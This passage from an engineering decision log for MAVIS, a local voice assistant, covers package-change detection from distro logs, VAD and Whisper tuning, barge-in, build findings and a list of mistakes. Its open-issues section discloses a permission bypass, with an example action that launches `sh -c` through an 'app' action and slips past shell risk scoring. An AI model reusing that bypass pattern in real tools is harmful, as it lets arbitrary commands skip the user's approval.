**Why:** Phase 8 audits what *MAVIS* does. The Sentinel audits what happened *to the machine*. Same shape as the safety layer on purpose: a static classifier, an append-only record, no LLM in the judgement path.

### Decision · No malware verdicts
See ADR-010.

### Decision · Read the package manager's transaction log, not a package-list diff
**Decision:** `/var/log/pacman.log`, `/var/log/dpkg.log`, `/var/log/dnf.rpm.log`.
**Why:** Two things a diff of "installed now" against "installed last time" cannot do: the log carries the real timestamp, so MAVIS can say "your update on Thursday"; and it distinguishes a brand-new package from a version bump. On Debian a single token does it — `install foo <none> 1.2.3`, where `<none>` means the package wasn't there before. All three logs are world-readable; no root needed.

### Decision · "Didn't ask for it" is the signal
**Decision:** A newly installed package that is absent from the manager's explicit set (`pacman -Qeq`, `apt-mark showmanual`, `dnf repoquery --userinstalled`) arrived as someone else's dependency — the Hyprland case. It is **Notable**. Upgrades are **Routine** and never spoken.
**Safety valve:** if the explicit-set query fails, everything is treated as requested. A broken query produces silence, not a flood of false alarms.

### Decision · Severity is static
**Why:** The same reason as ADR-007. A model that misjudges severity either cries wolf until the user stops listening, or stays quiet about the one change that mattered. Both failures are silent.
**Tiers:** Routine — recorded, never announced. Notable — spoken next time the user talks to MAVIS. Critical — desktop notification immediately.

### Decision · Parsers are pure functions
**Why:** Text in, entries out. That is what allowed all three distributions' formats to be tested on a machine that has only one of them, and the Debian parser to be run against 675 KB of real history.

### Problem · Every Ubuntu machine would have raised a false alarm
**Date:** 2026-09-20
**Symptom:** Run against a real `dpkg.log`, the parser flagged three downgrades:
```
gcc-14-base : 14-20240412-0ubuntu1 -> 14.2.0-4ubuntu2~24.04.1
libgcc-s1   : 14-20240412-0ubuntu1 -> 14.2.0-4ubuntu2~24.04.1
libstdc++6  : 14-20240412-0ubuntu1 -> 14.2.0-4ubuntu2~24.04.1
```
**Actual cause:** Those are ordinary upgrades. The first version comparison discarded separators, so it compared `20240412` against `2`. In dpkg's real algorithm, the `-` against the `.` at that position decides it first.
**Why it mattered:** those packages are on *every* Ubuntu machine — the false alarm would have fired for every Debian-family user on first run.
**Fix:** Implement dpkg's comparison properly — alternating non-digit and digit runs, separators significant, `~` sorting below end-of-string, letters below other characters.
**Evidence:** **Measured.** 0 false downgrades across the same 1,172 real transactions, with the synthetic downgrade tests still passing — correct, not blinded. The three real version strings are permanent regression tests.

### Evidence · Arch parser against real lines
**Date:** 2026-09-20. Three genuine `installed` lines from the target machine parsed 3/3, hyphenated names intact, and the `+0545` timezone — a 45-minute offset, which trips naive parsers — converted correctly (`15:53:58+0545` → `10:08:58 UTC`).

### Decision · The first run is silent
**Context:** The target machine's log holds **2,079 transactions**.
**Decision:** On first run, everything is recorded but marked already-announced. Only changes from then on are reported.
**Why:** Announcing a machine's entire history the first time MAVIS starts is worse than saying nothing. Recording it anyway means "what changed last month?" works immediately.
**Evidence:** Measured — 1,172 transactions imported, 0 announced.

### Decision · One sentence per update, not per package
**Context:** **110 explicitly installed packages**, against roughly ten times that installed. On Arch, nearly everything is a dependency.
**Decision:** Changes are grouped back into the transaction that produced them — entries within 300 s from the same package manager — and each becomes one sentence: *"Your system update on Friday pulled in 3 packages you didn't ask for: hyprland, linux-firmware-amd and linux-firmware-ti."*
**Why:** A sentence per package would make MAVIS unbearable within a week. At that point the user stops listening, and the subsystem has failed at its only job.

### Decision · The watermark is a timestamp, not a byte offset
**Why:** Logs get rotated. After logrotate truncates the file, a byte offset points at nothing, or at the wrong place. A timestamp survives rotation.

### Problem · Entries written in the watermark's second were lost
**Date:** found and fixed 2026-09-20
**Cause:** The filter was strictly *after* the watermark. A big update writes its log lines over several minutes, and the mtime check makes it easy for a scan to land mid-transaction. If that scan set the watermark to `12:00:05` and pacman then wrote more lines stamped `12:00:05`, they were dropped — permanently, because they were discarded *before* being fingerprinted, so deduplication never saw them.
**How it was found:** while explaining what a watermark is. Not by a test, not by a user.
**Fix:** At-or-after, with the fingerprint doing the deduplication. Re-examining one second costs nothing.
**Evidence:** **Proven.** Against the old filter the regression test fails with `left: 0, right: 2`.

### Problem · A test that didn't guard its fix
**Date:** 2026-09-20
**What happened:** The first test for the watermark fix exercised `packages::entries_since` directly. Reverting `scan()` to the old filter would have left it green: it documented the behaviour without protecting it.
**Fix:** The rule was extracted into `fresh_since()`, which `scan()` calls and the test drives. The test was then run against the reverted code to confirm it fails.
**Lesson:** a regression test is only proven when it has been seen failing.

### Problem · A summary whose word order depended on the caller
**Cause:** `summarize()` preserved input order, while `summarize_all()` sorted through grouping. Same function, different sentences, depending on how the slice was assembled.
**Fix:** `summarize()` sorts internally, oldest first, so the sentence reads in the order things happened.

### Evidence · End-to-end on a live system
**Date:** 2026-09-20. Against a real `dpkg.log`: installed `cowsay` and `figlet`, which pulled in `libtext-charwidth-perl`.
```
Run 1  fresh store      1172 imported silently, 0 announced
Run 2  after install    3 changes detected, 1 spoken:
       "Your system update today pulled in libtext-charwidth-perl, which you didn't ask for."
Run 3  nothing changed  0 new, silent
```
It said nothing about the two packages that were asked for.

### Decision · Scanning costs one `stat()` per minute
**Why:** The log is re-read only when its modification time moves. Leaving the Sentinel on is effectively free.

### Decision · Critical changes go through the permission gate
**Why:** A `notify` action scores 0 and is approved without asking — but it still lands in `audit.db`. The Sentinel cannot become a back door to the executor.

### Decision · `SystemChange` stays out of working memory
**Why:** A large update would evict the conversation from the 50-slot ring — the failure §7 already fixed once.

### Decision · `dnf` queries run with `--cacheonly`
**Why:** A background scan must never stall on a slow mirror.

### Status · Step 2b — speaking — is built (2026-10-01)
See §19. Everything above still holds; 2b adds a reader, it doesn't change what is detected or how severe it is.

### Status · The RPM parser is unverified on real hardware
Written from the documented format and unit-tested, but never run against a live Fedora system. Marked `UNVERIFIED ON REAL HARDWARE` in the source. If a Fedora user sees something strange, suspect the parser first.

---

## 11. Orb UI

### Decision · `minifb` rather than raw Wayland
**Date:** Phase 1
**Why:** Fast to get a window on screen. Raw Wayland was planned for later and has not been built.

### Problem · The orb couldn't be dragged
**Date:** 2026-09-16
**Cause:** `MouseMode::Clamp` restricts the reported cursor position to the window's own 80×80 bounds, so a drag could never register movement past the edge.
**Fix:** `MouseMode::Pass`, and drag reduced to a delta.

### Decision · `MAVIS_ORB_POS=x,y` for placement
**Why:** So the orb can be parked in a corner while reading logs.
**Known limit:** native Wayland ignores client-requested window positions. The real fix is `wlr-layer-shell`, which is identified and not built. See §14.

### Decision · `MAVIS_ORB=off` exists — but not as advice
**Date:** 2026-09-16
**What happened:** It was suggested for a test run. The pushback was right: *"It was indicator if MAVIS was listening, processing or not responding."* The orb is the only live signal of what MAVIS is doing. The flag stays, for headless use only.

---

## 12. Process, tooling and build

### Decision · Complete files, not diffs
Every change is delivered as whole files. Less room for a mis-applied hunk.

### Decision · One commit per file, short messages
Subject lines stay under 72 characters, with at most a line or two of body. Consequence worth knowing: when a change is atomic across two files — adding an enum variant and the match arm that handles it — one-file-per-commit leaves an intermediate commit that doesn't compile. That was accepted knowingly.

### Decision · The end-to-end regression test was left out
**Date:** 2026-09-20
`tests/panic_recovery.rs` was offered and not taken. It is not needed to build or run MAVIS; it is the only test that exercises "a bad transcription must not stop MAVIS answering the *next* thing", and the only way to reproduce the §9.1 diagnosis independently. The unit tests for every individual fix were kept.

### Decision · Changes aren't pushed on the user's behalf
Work was prepared on a scratch branch and delivered as files, then committed and pushed by the user.

### Observed · Recommits for trailing newlines
On 2026-09-18 and 2026-09-21, some commits change only a file's final newline — an editor normalising the delivered files — and reuse the previous commit's message, which makes the history look duplicated. Harmless. A message like `chore: normalise trailing newlines` would make it obvious; an `end-of-file-fixer` pre-commit hook would stop it happening.

### Observed · One commit has the wrong subject line
`7e6ed8f` — the watermark fix — has the subject `timestamp. Filter at-or-after and let the fingerprint dedupe.`, which was the *third* line of the intended message; the first two were lost. The code in it is correct. It has been pushed, and rewriting published history isn't worth it for a message.

### Recommendation · Commit `Cargo.lock`
**Finding, 2026-09-21:** `Cargo.lock` is gitignored — beneath a comment noting that Cargo recommends committing it for binary crates. Every fresh clone therefore resolves whatever dependency versions are newest that day. Already visible: the target machine resolved `uuid 1.24.0`, a fresh clone `uuid 1.26.1`, from the same commit.
**Why it matters here:** the goal is that MAVIS builds as well on Debian as on Arch. An unpinned lock means the minimum Rust version drifts upward by itself, and a bad dependency release can break a fresh build on someone else's machine while the author's cached build keeps working.
**Status:** recommended, not done — it's the maintainer's call.

### Finding · The real minimum Rust version is 1.85
The README said 1.80. The locked dependency tree requires **1.85** (`getrandom 0.4.3`, `uuid`). Debian 12 ships rustc 1.63, so it needs `rustup`. Ubuntu 24.04's default `rustc` is 1.75, but it also offers versioned packages — `rustc-1.85` and newer — checked on a real 24.04 system rather than assumed; an earlier draft said Ubuntu couldn't build MAVIS from packages at all.

### Finding · Build dependencies, verified by removing them
**Date:** 2026-09-21
Established by uninstalling packages and rebuilding from clean, not by reading docs. Required: a C compiler (SQLite is compiled from source via rusqlite's `bundled` feature), `pkg-config`, and the ALSA headers — the build fails without `libasound2-dev`. **Not** required: X11 and Wayland headers. `minifb` loads those libraries with `dlopen` at runtime, so a Debian box builds without `libx11-dev`, `libxkbcommon-dev` or `libwayland-dev`. An earlier draft of the README listed all three.

### Finding · `cargo clippy` fails, and the pre-commit hook can't notice
The Definition of Done in `PHASES.md` says code passes `cargo clippy`. It doesn't: `executor.rs` has a loop clippy rejects as "never actually loops" (§14). The pre-commit hook runs only `ruff`, which skips every Rust commit, so nothing enforces it.
**Update 2026-09-22:** the loop is fixed (§15), so `cargo clippy` now passes with warnings only. The hook still doesn't run it.

### Finding · Versions and tags don't agree
**Date:** 2026-09-21
Only `v0.3.0-ai-worker` was ever tagged; `PHASES.md` had ticked boxes claiming `v0.1.0-foundation` and `v0.2.0-core-runtime`, which don't exist. The two halves also disagree: `mavis_core/Cargo.toml` says `0.1.0`, `mavis_worker/pyproject.toml` says `0.3.0`. Since the tag there have been 192 commits covering Phases 4 through 8.5. `CHANGELOG.md` now says all of this plainly; picking a version for the next tag is open.

### Decision · Remove the duplicate Python VAD and microphone code
**Date:** 2026-09-14
**Why:** `stt/mic.py` and `stt/vad.py` duplicated what the Rust side does — the Rust VAD is the single source of truth, and faster-whisper runs with `vad_filter=False` so the two never disagree. `app.py`, `main.py`, `bootstrap.py`, `core/events.py` and `core/lifecycle.py` were Phase 1 scaffold that nothing reached; the worker starts from `worker.py`.

### Problem · Uploaded logs arrived empty
Several log uploads arrived as empty files. Saving them as `.txt`, or sending screenshots, worked around it.

---

## 13. Mistakes and retractions

Kept so the same mistakes are recognisable next time.

| Date | What went wrong | What it taught |
|---|---|---|
| 09-02 | The echo fix was declared done while wiring two different flags | Verify on hardware, not in review |
| 09-02 | One UTF-8 panic fixed; three siblings left for 18 days | Fix the class — search for the pattern |
| 09-12 | "TTS is fire-and-forget" — claimed without reading the code | Read before diagnosing |
| 09-12 | 400 ms silence written, contradicting a 450 ms measurement | Check new values against the measurements they rest on |
| 09-14 | VAD energy logging removed, then badly needed | Keep diagnostics that separate "our bug" from "their setup" |
| 09-16 | `MAVIS_ORB=off` suggested for testing | The orb *is* the status indicator |
| 09-16→19 | Two fixes — recall `role='user'`, XDG discovery — written and never committed | Confirm a commit landed; don't assume |
| 09-19 | A 104→35 app regression blamed on the XDG change — which wasn't in that build | Establish what's actually running before blaming a change |
| 09-20 | Version comparison dropped separators; false alarm on every Ubuntu machine | Test against real data, not only fixtures |
| 09-20 | Watermark filter lost entries at its own boundary | Explaining a design out loud finds bugs |
| 09-20 | A regression test that couldn't fail | A test is proven only once it has been seen failing |
| 09-20 | A test assertion written for the wrong order | Check the helper's semantics — "seconds ago", not "seconds" |
| 09-20 | Mic gain 0.6 recommended without measuring it | A number without a measurement is a guess — label it as one |
| 09-22 | Fixed thresholds kept because they were "calibrated" — for one room, one gain, no fans | Calibration holds only under the conditions it was measured in |

---

## 14. Open issues

Known, recorded, not yet fixed. Roughly in the order they'd be felt.

**Verification still owed** *(as of 2026-09-30)*
- **Barge-in on real speakers**: talking over a reply, and MAVIS not interrupting itself. It did, on every reply, until the §17 fix — which has not been run since
- **"stop" / "quiet" / "cancel"** going silent without an answer
- **Any action actually launching.** No `[app]` action has ever appeared in a log; every "Opening Firefox" so far was the model narrating. The matcher was rewritten on 09-26 and hasn't been exercised
- `MAVIS_BARGE_IN=0`, `MAVIS_SPEECH_GATE=0`, `MAVIS_AUDIO_OUTPUT` — all added, none ever set
- GNOME crash fix on a real GNOME session
- Calendar has-events path (the calendar is empty)
- Windows and macOS app discovery; the RPM parser

**Latency and portability**
- First STT attempt waits up to 300 s, and utterances are processed one at a time
- A malformed STT reply is retried by re-running full transcription, up to 5 times
- Resampling has no anti-aliasing filter — a plausible contributor to mistranscriptions. Less often reached since 2026-09-22: 16 kHz is now preferred in any sample format, and 192 kHz devices are no longer opened at their maximum rate
- The VAD is still energy-based. It now follows the room, but speech only ~2× louder than steady noise can go unheard, and non-steady noise (typing, a video playing) can still start an utterance. Silero catches those on the worker side before Whisper sees them, so the cost is a wasted round trip rather than an invented sentence
- Barge-in needs the user to be about twice as loud as MAVIS's own voice in the microphone. Echo cancellation (PipeWire's `module-echo-cancel`) or headphones remove the problem entirely; without either, false pauses happen — they cost a pause, not the reply
- `n_gpu_layers` is 20 because full offload failed on 6 GB. Somewhere between 20 and 33 is probably faster and still fits — unmeasured
- **Capture arrives at 2.2–2.3× full scale.** The PipeWire source volume is 0.60, so the gain is upstream in ALSA — capture level or mic boost, unconfirmed. Whisper confidence sits at 0.37–0.77 because of it. The worker scales anything over 1.0 back to 0.95, which limits the damage without fixing it. **This is the first thing to chase.**
- Memory lives at `../memory`, relative to the working directory

**Security**
- `app` actions bypass shell risk scoring: `ELEVATED_TOKENS` have trailing spaces, so `"sudo".contains("sudo ")` is false, and `args` aren't scored. `{"type":"app","target":"sh","args":["-c","…"]}` scores 2 and runs. Not reachable from voice today.
- Worker socket is `0666` in `/tmp`
- `"ok"` counts as consent
- Fixed temp WAV paths in `/tmp`; `kill -15 <pid>` can hit a reused PID

**Worker**
- Idle unload can race an in-flight inference; `WorkerServer.lock` guards nothing
- Ctrl+C removes the socket but never stops `serve_forever()`
- Dropped utterances under back-pressure aren't logged

**Dead code**
- `EpisodicStore` is written, never read, never pruned
- `MAVIS_ACTIVE_LISTEN` can't cross the process boundary it's meant to
- Unused platform traits and fields: `AudioCapture`, `ScreenGrabber`, `LinuxScreen.wayland`, `parse_png_dimensions`, `_shutdown_tx`

**Not built**
- Sentinel steps 2b–5: speaking pending changes, answering "what changed?", privilege surfaces, integrity and CVE checks, Windows and macOS
- `wlr-layer-shell` for the orb on native Wayland
- Phase 8 rollback; per-skill permissions (needs Phase 9)

---

## 15. The 2026-09-22 live run

The first full run after the audit. Everything started, nothing panicked, the Sentinel imported 2,124 past pacman transactions silently as designed. But a single "hello MAVIS, can you hear me" took **60 seconds** to answer, and the answer was to a sentence the user never said. The log was read line by line; every problem found is below.

**Where the 60 s went:** listening 45 s · transcription 3 s · LLM 11 s · speech 5 s.

### Problem · MAVIS never heard the user stop talking
**Symptom:** `SPEECH START` at 08:44:28, then nothing until `FORCED END — hard ceiling` 45 s later. The utterance was ~2 s long.
**Actual cause:** The thresholds were effectively fixed. The noise floor could adapt, but it was capped at 0.045 and reset to 0.035 after every utterance, so the end threshold never rose above 0.06. With the mic at 0.6 (§4) and fans spinning up as the model loaded, the room itself sat above 0.06 — every frame read as speech. The same reset caused two more false starts: one second after the forced end, and the instant MAVIS finished speaking.
**Fix:** In `stt.rs`:
- The fixed thresholds stay as **minimums**, and a noise-relative part is added on top (1.8× the floor to start, 1.5× to end). In the quiet room both land below the minimums, so behaviour there is unchanged.
- The floor is **measured for the first second** of listening rather than assumed; it follows quiet quickly and noise slowly; it is **no longer capped at 0.045 or reset** between utterances.
- Energy is **smoothed** (~70 ms). Steady fan noise flickers above and below a threshold frame by frame, and a single loud frame used to reset the silence count.
- **Stuck detection:** real speech always dips between words. If the quietest moment in 2.7 s of "speech" is still above the end threshold, it's the room — the floor is re-measured from that moment and the utterance ends.
- The utterance's **tail is trimmed** to 300 ms after its last loud frame, so Whisper doesn't get seconds of fan noise to invent words from. An utterance that never rose above the start threshold for the room as now measured is dropped.
- Partial frames are **carried over** between audio callbacks instead of appended unanalysed.
- Hard ceiling **45 s → 30 s**.
**Why not a speech-trained VAD:** WebRTC VAD (`webrtc-vad` crate) was built and tried: on its most aggressive setting it still flagged loud hiss as speech, so it didn't clearly beat the energy approach at the one thing that failed. Silero needs ONNX Runtime in the Rust core. Neither has earned its dependency yet; both stay the next step (§14).
**Evidence:** Proven in simulation — five tests with synthetic room noise and speech, including a room that jumps from 0.03 to 0.10 mid-utterance (ends within ~1.5 s instead of 45 s) and noise wobbling ±90% frame to frame (no false utterances over a minute). A sweep showed ratios of 2.2× and 1.6× went deaf to speech only ~2.4× louder than the room, which is why 1.8× and 1.5× were chosen. **Not yet measured on the target machine.**

### Problem · "Thank you for watching, please subscribe…"
**Symptom:** The user said "hello MAVIS, can you hear me". The transcript added "Thank you for watching, please subscribe and hit the bell icon to get notified when I post new videos."
**Actual cause:** Whisper given ~40 s of fan noise fills it with the end of a YouTube video. `HALLUCINATION_DENYLIST` only dropped a transcript that was *entirely* a known phrase; real words came first, so the whole thing passed — and the LLM replied to it.
**Fix:** In `stt/engine.py`: outro phrases are matched **per sentence** and cut from the match onward (`OUTRO_PATTERNS`); segments Whisper itself flags as probably not speech (`no_speech_prob > 0.6` with `avg_logprob < -1.0`, or `compression_ratio > 2.4` — the thresholds from openai/whisper) are dropped individually. The VAD's tail trimming removes most of the noise that caused it in the first place.
**Evidence:** The exact transcript from the log now comes out as "Hello, Mavis. Mavis, can you hear me?" — tested against the function directly.
**Superseded the same day** by the next entry: a list of phrases to delete can never be finished.

### Decision · Detect speech instead of listing hallucinations
**Context:** Both `HALLUCINATION_DENYLIST` and the outro patterns above were lists of things Whisper had invented. Every new hallucination would need another entry — the list only grows, and it's always one step behind.
**Decision:** Remove both lists. Before transcribing, Silero VAD — a small neural network trained to tell speech from everything else — marks which parts of the audio are someone talking. If there are none, Whisper is never called. If there are, Whisper is given only those parts (`vad_filter=True`). Whisper can't invent words over noise it never hears.
**Why Silero, why here:** It ships inside faster-whisper, with onnxruntime, so it adds no dependency. Putting it in the Rust core instead would have meant adding ONNX Runtime there (§15, the VAD entry). The Rust energy VAD still decides when you've stopped talking; Silero decides what was speech.
**Reverses:** `vad_filter=False`, set 2026-08-15 to fix "empty transcripts". That was the same session that fixed a microphone routed to nothing and audio truncated over the socket (`PHASES.md` §4.5), so the filter was most likely being fed no speech — correctly finding none. Not provable now; `MAVIS_SPEECH_GATE=0` turns the gate off if real speech is ever dropped, and every drop is logged with the audio's length and peak.
**What's left of the old defences:** Whisper's own per-segment signals (`no_speech_prob`, `avg_logprob`, `compression_ratio`), the confidence gate, and repetition collapsing. None of them is a list.
**Evidence:** Tested with the real Silero model: 40 s each of white, pink, brown and fan-like noise at three levels — zero seconds reported as speech in all twelve. A spoken phrase mixed into the same noise was found with correct boundaries whenever it was audible (lost only when the noise was louder than the speech). Through `transcribe()`: 40 s of noise returned nothing without calling Whisper. Not tested with Whisper itself — the model download is blocked in the sandbox — so the first live run is the real check.

### Problem · An unpunctuated transcript came back empty
**Found while fixing the above.** The sentence-level de-duplication in `_deduplicate_repetition` walked `(sentence, punctuation)` pairs and stopped one element early, dropping any text after the last punctuation mark. "hello mavis can you hear me" became "", and "Hi. open firefox" lost the command. Whisper usually punctuates, which is how it went unnoticed.
**Fix:** Walk every element. **Evidence:** tested.

### Problem · 11 seconds to produce one sentence
**Actual cause:** The planner asked for up to 256 tokens and nothing stopped the model at a line break. It generated a paragraph; the worker then kept the first line, at most two sentences and 180 characters, and threw the rest away.
**Fix:** Generation is **streamed** and stopped as soon as it has produced everything post-processing would keep (`_reply_complete`, which mirrors `_post_process`'s rules exactly). `max_tokens` 256 → 96 as a backstop. And the fixed system prompt is **evaluated during warm-up**, which is requested the moment the user starts speaking — llama.cpp reuses that prefix, so prompt processing overlaps with the user talking.
**Why stream rather than a `"\n"` stop token:** the model sometimes opens with a newline, and a newline stop would then end generation before any text. `_post_process` had the same flaw — a leading newline made the kept "first line" empty — also fixed.
**Evidence:** Equivalence tested — for sample outputs, post-processing the early-stopped text gives exactly the same reply as post-processing the full generation. Real timing isn't measured yet; each reply now logs `Reply: N tokens in Xs (first token Ys)` so it will be.

### Decision · Whisper `patience` 2.0 → 1.0
**Why:** Patience widens beam search beyond `beam_size`. 1.0 is the standard setting; 2.0 roughly doubled decode time with no observed difference. Beam size stays at 5.

### Problem · "The user's name is Using"
**Actual cause:** "I'm …" and "I am …" were treated as introductions. They introduce a state far more often than a name. The name was also persisted in `working_memory.json`, so it came back every run.
**Fix:** Only "my name is …" and "call me …", matched as whole phrases. A name must be one word of letters and not a common English word. A stored name that fails these checks is discarded on load, which clears "Using".
**Why not extend the denylist again:** it had been extended five times (§5). Guessing every word that can follow "I'm" is a losing game; not treating "I'm" as an introduction ends it.
**Superseded the same day:** the first version of this fix still kept a word list. Replaced by the next entry.

### Decision · Recognise a name by how it's said, not by a list of non-names
**Decision:** No word list at all. A name is taken only when all of these hold:
1. An explicit introduction — "my name is X", "call me X", "I'm called X". Never "I'm X" or "I am X".
2. X ends its clause — nothing after it, or punctuation, or "and". Names come last; "call me back later" and "my name is not important" keep going.
3. The sentence isn't a question.
4. After "call me", X is capitalised as transcribed. Whisper capitalises proper nouns, so "call me maybe" and "call me back" come out lowercase. "My name is" is unambiguous enough to accept lowercase, which typed input needs.
Names stored by older builds carry no marker that they were learned this way, so they are dropped once on load, which clears "Using". A real name from before has to be said once more.
**Why this is enough:** MAVIS then uses the name, so a mistake is heard at once and corrected by saying the name again.
**Evidence:** Tested: seven introductions learned, twelve non-introductions rejected — including "I'm using the terminal", "Call me back later.", "What's my name is what I asked?" and the log's own "Hello, Mavis. Mavis, can you hear me?". Those tests were run and then left out of the repository at the maintainer's request — the codebase keeps no example sentences. If this rule set proves wrong in use, the next step is to let the model extract the name, or to drop extraction and rely on recall.

### Problem · MAVIS thought the user was looking at MAVIS
**Symptom:** `[active_window] The user is currently in unknown — "MAVIS"` and `[project] … MAVIS project at /home/…/MAVIS`.
**Actual cause:** The orb is a window and the compositor reported it as focused. Project detection then read the working directory of MAVIS's own process.
**Fix:** MAVIS's own windows are removed from the window list (by PID, or by the "MAVIS" title where no PID is reported). While the orb has focus, the user is taken to still be in the window they were in before.

### Problem · Every reply appeared twice in the prompt
**Symptom:** `[mavis] You called me Mavis earlier.` followed by `[plan] You called me Mavis earlier.`
**Cause:** The history included both the worker's response and the plan built from it.
**Fix:** History is built from plans only, labelled `mavis` (which the prompt's echo filter expects). The current utterance is also excluded from history and recall — depending on task order it could already be there, which put the user's message in the prompt twice.

### Decision · The clipboard is sent only when asked about
**Why:** It went into every prompt: noise the model had to ignore, and whatever happened to be copied — in the log, the launch command; in general, sometimes a password. With `MAVIS_CONTEXT_CLIPBOARD=1` it is now included only when the user mentions the clipboard, copying or pasting.

### Decision · Log context changes, not context polls
**Why:** `context injected — app=…, clipboard=…` was logged every 2 s, burying everything else, and printed the start of the clipboard into logs that get pasted into bug reports. Now logged only when it changes, with the clipboard as a character count.

### Problem · The speech fallback could never fall back
**Cause:** A missing `spd-say` returned an error straight out of the loop, so `espeak` was never tried — clippy's "never actually loops" (§12). `spd-say` also returned immediately, before speaking, so the microphone reopened while MAVIS talked.
**Fix:** Try `spd-say --wait`, then `espeak-ng`, then `espeak`; skip any that aren't installed or fail. `cargo clippy` now passes (warnings only).

### Decision · Accept integer-format microphones
**Why:** Some USB microphones and plain ALSA devices offer only 16- or 32-bit integer samples; MAVIS refused them with "unsupported sample format" and ran deaf. They are now converted at the edge. The input format is now chosen as: 32-bit float over integer, 16 kHz over anything else, then 48, 32 or 44.1 kHz — previously a device without 16 kHz float was opened at its maximum rate, which can be 192 kHz.

### Minor
- Kokoro is given its `repo_id` explicitly, silencing "Defaulting repo_id" on every load; two harmless torch warnings raised inside Kokoro's model code are suppressed during load only.
- `STT result: '…...'` no longer appends "..." to text that wasn't truncated.
- Removed the dead `SttHandle.tts_active` field.

### Not problems
- **35 apps, down from 104.** Most likely duplicates: the old build had no de-duplication, and the same `.desktop` file appears under several XDG directories. Unconfirmed; `find … | xargs -n1 basename | sort -u | wc -l` settles it.
- ALSA `/dev/dsp` messages are cpal probing the legacy OSS path; harmless.

---

## 16. The 2026-09-26 live run and barge-in

23 exchanges, two runs with a restart between them. The §15 fixes held: **2 s median** from the end of speech to MAVIS talking (was 60 s), replies of 8 tokens in 0.66 s median, listening ending 0.5–1 s after the user stopped every time, and **not one hallucinated sentence**. What the run exposed instead was that MAVIS had been *describing* actions it never performed.

### Problem · "Opening Firefox" — five times, nothing opened
**Symptom:** No `[app]` action appears anywhere in the log. Every "Opening Firefox." was the language model talking, including twice when the user hadn't asked for anything of the kind.
**Three causes, all in `match_action_intent`:**
1. The verb had to be the first word, so "Let's open Firefox" fell through to the model.
2. Addressing MAVIS left a comma behind: "MAVIS, open Firefox browser" became ", open firefox browser", and no prefix matched.
3. `find_app` required every spoken word to appear in the app's name, so "firefox browser" didn't match Firefox.
**Fix:** The verb may appear anywhere, *provided what follows names something real* — a URL or an installed app. That evidence is what keeps "how do I open a file" out. Punctuation is trimmed at both ends after the wake word. `find_app` gained a last rule: an app whose name appears in what was said, longest match first, so "visual studio code" beats "code".
**And the deeper one:** nothing told the model it can't act. Rule 14 now says so plainly — it cannot open apps or control the machine, and should say so rather than narrate. The planner's own "Opening Firefox." is unaffected: that is only spoken when the app actually launches.

### Problem · The model repeated its own last reply
**Symptom:** Three times, a short or garbled utterance was answered with the previous reply word for word — including reading the clipboard out unprompted, and "Your name is Mavis" with "The user's name is Manav." sitting sixteen lines above it in the same prompt.
**Cause:** Fifteen events of history — about seven exchanges — and the facts placed far from the question. A 3.8B model copies the nearest plausible answer.
**Fix:** History cut to the last three exchanges. The profile facts moved to the *end* of the system prompt, under a heading that says they are current and outrank the conversation (rules 15 and 16 say the same in words).

### Decision · Say "I didn't catch that" instead of answering a guess
**Why:** "I'm working on it right now, where it is" was a misheard question, and MAVIS answered it confidently. The worker already computes each transcript's confidence but was throwing it away.
**Decision:** Confidence travels with the text. Below 0.55 — above the worker's own 0.45 floor, where Whisper returns fluent nonsense — MAVIS says it didn't catch it rather than answering.

### Decision · Barge-in: listen while speaking, stop when spoken to
**Context:** The microphone was muted outright while MAVIS talked, so the interruption machinery built in Phase 5 (kill playback, drain the queue) could never fire from voice: the only path to it was a `UserIntent` that could not be produced. "Always present, never intrusive" fails if you can't stop it talking.
**Decision:** Keep analysing audio during playback, against a threshold raised above MAVIS's own voice. `echo_level` tracks how loud playback arrives in the microphone, rising fast and falling slowly; it takes **1.4×** that to count as someone speaking, confirmed in 150 ms rather than the usual 250. The first 750 ms of a reply is spent measuring the echo and can't be interrupted. On trigger, `stt.rs` publishes `TtsInterrupt` immediately — before transcription, because an interruption that lands two seconds later isn't one — and the rest of the sentence is captured as an ordinary utterance.
**"Stop" itself:** recognised in the planner as a request for silence, not a question, so the model never gets a turn to answer it. Narrow by construction: at most four words, and one of them has to be the point of the sentence.
**Evidence:** Simulated against MAVIS's own voice at four loudness levels: no self-interruption at any of them, and a voice twice as loud as the echo broke through at all four. 1.5× did not, and 2.0× as a ratio failed entirely — smoothing keeps a syllable from ever reaching its full height between gaps. **Not yet tried on real speakers**, where the echo depends on volume and mic placement; `MAVIS_BARGE_IN=0` restores the old behaviour.
**Known limit:** the last fraction of a second of MAVIS's own voice is inside the captured audio. The speech detector and the tail trim remove most of it; headphones remove all of it.

### Problem · Real speech thrown away
- **Four utterances dropped as "too short"** (1.0–1.4 s), including one-word replies. The 1.5 s minimum existed because Whisper invents words from clicks — the worker's speech detector now does that job, so it's down to 0.8 s.
- **One dropped as "it was the room"** when the floor had drifted to 0.22. That test now only drops audio that never reached the *end* threshold; anything above goes to the worker, which is better at this than an energy comparison.
- **The floor drifted because it learned from the wrong frames.** It updated on every frame not yet confirmed as speech, so a word's onset and post-playback echo pushed it up. It now only learns from frames clearly below the speech threshold.

### Decision · A question is not a memory
**Why:** Recall kept feeding the user's own past questions back into the prompt ("[recalled] Earlier, user said: What is my name, Mavis?"). That is noise, and it competes with the answer. Questions now score below the storage threshold. Statements, stated facts and preferences are unaffected.

### Problem · The worker's logs never existed
`setup_logging()` was defined and never called, so every `logger.info` in the Python worker went nowhere — the root logger defaults to WARNING with no handler. Only `print()` reached the Rust log. Every STT diagnostic added on 09-22 was invisible during the 09-26 run: speech found, segments dropped, confidence, all of it. Called now, in `main()`.

### Not a bug · No shutdown lines after Ctrl+C
The log ends at `^C` with none of the shutdown messages. Ctrl+C goes to every process in the foreground group, so `tee` dies first and the rest of the output has nowhere to go. Redirect instead of piping (`> ~/mavis-test.log 2>&1`) to see the shutdown sequence.

### Minor
- Kokoro asked Hugging Face about its weights on every load. When the model is already in the cache, `HF_HUB_OFFLINE` is now set before the import, so a local-first assistant starts without the network.
- The two `/dev/dsp` ALSA errors are cpal probing the legacy OSS device. Harmless.

### Still open after this run
- **Transcription quality is now the weak link**: "Hello Robus", "I'm in blinding, watch yours". The measured room level was 0.16–0.18 with speech frames peaking at 0.75, which means the input is almost certainly clipping. The mic gain was raised to 0.6 back when thresholds were fixed numbers (§4); they follow the room now, so a lower gain costs nothing and gives Whisper cleaner audio.
- MAVIS captures from `sysdefault:CARD=Generic` rather than PipeWire, bypassing whatever processing is configured there. Changing it needs the `pw-play --device`/`--target` bug fixed first, or playback breaks.

---

## 17. The 2026-09-27 run — MAVIS interrupting itself

